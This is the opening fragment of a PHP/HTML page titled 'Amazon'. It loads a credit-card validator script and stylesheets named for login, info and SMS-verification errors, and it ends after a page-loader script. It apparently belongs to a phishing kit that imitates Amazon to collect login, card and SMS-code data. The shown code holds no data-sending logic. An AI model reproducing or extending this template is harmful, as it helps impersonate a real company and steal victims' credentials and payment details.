<?php session_start(); ?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>

   
    <link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <script src="cc-valid/jquery.creditCardValidator.js"></script>
    <link rel="stylesheet" href="css/login.css" />
    <link rel="stylesheet" href="css/info.css" />
    <link rel="stylesheet" href="css/verify-sms-error.css" />
  

    <title>Amazon</title>
  </head>
  <body>
  <div id="loader"></div>
  <script type="text/javascript">
      var loader;
      function loadNow(opacity) {
        if (opacity <= 0) {
          displayContent();
        } else {
          loader.style.opacity = opacity;
          window.setTimeout(function () {
            loadNow(opacity - .07);
          }, 100);
        }
      }
      function displayContent() {
        loader.style.display = "none";
        document.getElementById("content").style.display = "block";
      }
      document.addEventListener("DOMContentLoaded", function () {
        loader = document.getElementById("loader");
        loadNow(1.5);
      });
    </script>